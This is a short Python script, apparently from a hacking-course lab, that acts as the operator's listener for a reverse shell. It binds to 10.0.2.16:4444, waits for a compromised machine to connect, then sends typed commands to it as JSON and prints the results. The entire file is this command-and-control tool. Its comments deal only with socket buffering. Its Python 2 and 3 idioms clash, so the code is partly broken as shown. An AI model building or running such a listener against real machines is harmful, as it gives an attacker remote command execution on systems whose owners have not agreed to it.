#!/usr/bin/env python
# tcp pass data in stream by client rather than message .hence 1024 only at time to receive.server dont have knowledge of end of data 
# so for larger data to be send than 1024, use serialisation(json/pickle) form so json package data in form of text 
#more dssdd.txt command dont give all value
import socket,json
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        listener.bind((ip,port)) 
        listener.listen(0) 
        print("[+] waiting for incoming connection")
        self.connection, address=listener.accept() #to make connection acceptable to anywhere in code use self
        print("[+] got connection from " + str(address))
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        #use instead of socket send method for everytime we need to send data 
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue                
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)    
    def execute_remotly(self,command):
        self.reliable_send(command) 
        return self.reliable_receive() 

    def run(self):
        while True:
            command = input(">>")
            result=self.execute_remotly(command)
            print(result)
listener_obj=Listener("10.0.2.16",4444)
listener_obj.run()            

 